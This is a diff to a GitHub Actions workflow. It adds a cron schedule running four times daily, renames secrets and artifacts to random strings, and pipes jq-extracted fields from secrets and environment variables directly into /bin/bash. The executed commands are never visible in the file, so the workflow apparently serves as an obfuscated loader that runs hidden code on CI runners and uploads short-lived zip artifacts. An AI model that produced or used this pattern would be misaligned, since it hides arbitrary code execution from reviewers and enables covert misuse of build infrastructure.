@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,15 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          xa42428: ${{ secrets.xa42428 }}
+          hjvd25797: ${{ secrets.hjvd25797 }}
         run: |
-          printf '%s' "$xa42428" | jq -r .jcb52957 | /bin/bash
-          echo $ofd291 | jq -r .zfsm334 | /bin/bash
-          echo $i46234 | jq -r .b66772 | /bin/bash
+          printf '%s' "$hjvd25797" | jq -r .zigrs21685 | /bin/bash
+          printf '%s' "$msqkp8" | jq -r .olu93645 | /bin/bash
+          echo $lg5569 | jq -r .eiecs7963 | /bin/bash
+          echo $n119 | jq -r .mp6 | /bin/bash
+          printf '%s' "$juqli57839" | jq -r .ovk4676 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: DYEKIk8g
+          name: IgqZEtRh
           path: "*.zip"
           retention-days: 1
